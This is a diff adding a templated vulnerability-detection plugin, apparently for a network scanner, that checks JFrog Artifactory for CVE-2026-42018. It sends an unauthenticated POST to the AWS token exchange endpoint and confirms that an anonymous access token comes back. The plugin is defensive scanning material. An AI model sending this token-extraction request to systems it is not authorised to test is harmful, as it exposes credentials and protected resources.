@@ -1,0 +1,114 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "JFrog_Artifactory_Token_Exposure_CVE_2026_42018"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-42018"
+  }
+  severity: HIGH
+  title: "Anonymous user token generation exposure in JFrog Artifactory (CVE-2026-42018)"
+  description: "JFrog Artifactory could return an internal anonymous-user token to an unauthenticated caller via the AWS token exchange endpoint when anonymous access is disabled, potentially exposing sensitive resources."
+  recommendation: "Upgrade JFrog Artifactory to version 7.146.8, 7.133.28, 7.125.19, 7.117.27, 7.111.20 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-42018"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_artifactory"
+  http_request: {
+    method: GET
+    uri: "/artifactory/api/system/ping"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "OK"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_anonymous_disabled"
+  http_request: {
+    method: GET
+    uri: "/artifactory/ui/auth/current"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"anonAccessEnabled\":false"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_token_exposure"
+  http_request: {
+    method: POST
+    uri: "/access/api/v1/aws/token/"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"access_token\":"
+          },
+          {
+            body: {}
+            contains: "\"username\":\"anonymous\""
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_artifactory",
+    "check_anonymous_disabled",
+    "trigger_token_exposure"
+  ]
+}
